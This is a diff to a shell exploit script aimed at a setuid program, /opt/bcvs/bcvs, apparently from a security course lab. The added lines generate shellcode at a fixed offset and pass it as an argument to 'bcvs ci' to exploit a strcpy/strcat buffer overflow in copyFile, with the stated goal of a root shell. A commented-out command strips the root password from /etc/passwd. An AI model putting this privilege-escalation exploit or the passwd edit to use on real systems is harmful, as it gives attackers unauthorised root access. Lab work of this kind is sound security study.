@@ -8,9 +8,13 @@
 #
 # Right now this sploit is not complete but being able to
 # bypass the block check is a start.
+#
+# Right now I am working on exploiting the strcpy/strcat
+# overflow in the copyFile function.
 ## ----------------------------------------------------- ##
 
 # Setup necessary environment
+make -f Makefile exploit
 mkdir -p sploit1_dir
 cd sploit1_dir
 mkdir -p .bcvs
@@ -20,4 +24,12 @@ touch .bcvs/block.list
 # Following will give the root user no password
 # cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'
 
-echo "comment\n" | /opt/bcvs/bcvs ci bcvs_info.py
+SHELL_CODE=$(../exploit)
+#echo "$SHELL_CODE"
+
+OFFSET=425
+echo "Trying offset: $OFFSET"
+SHELL_CODE=$(../exploit $OFFSET)
+/opt/bcvs/bcvs ci "${SHELL_CODE}"
+
+# And then hopefully you have a root shell at this point
